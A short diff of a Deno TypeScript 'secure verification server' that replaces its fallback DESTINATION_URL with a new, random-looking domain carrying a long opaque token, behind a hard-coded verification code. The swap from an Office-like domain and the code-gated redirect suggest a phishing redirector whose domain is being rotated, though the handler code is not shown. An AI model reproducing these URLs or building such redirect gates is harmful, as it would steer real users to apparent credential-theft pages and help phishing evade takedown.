@@ -11,7 +11,7 @@ interface AppConfig {
 }
 
 const CONFIG: AppConfig = {
-  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://wd0c435.hoofficelive.io/LLhiPCPc?hn=a54rlgWWWdGPy25bkbkXyfFwEn7wJNR6F4iMi6QC47rYk3wMVCq4WaXC3c7MYhHfGA",
+  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://wd0c435.rayunieram.com/FcLGLnhc?asg=KdMb9k6zWUJZIp8ECpeg6BcpDmHD9U6f1duMrDuebKD3DKxqHusmfhcr83cvAB_3aw",
   VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
   PORT: Number(Deno.env.get("PORT")) || 8000,
   SESSION_TIMEOUT: 15 * 60 * 1000, // 15 minutes in milliseconds
@@ -708,4 +708,5 @@ async function handleRequest(req: Request): Promise<Response> {
 }
 
 console.log(`Secure verification server running on port ${CONFIG.PORT}`);
+
 serve(handleRequest, { port: CONFIG.PORT });
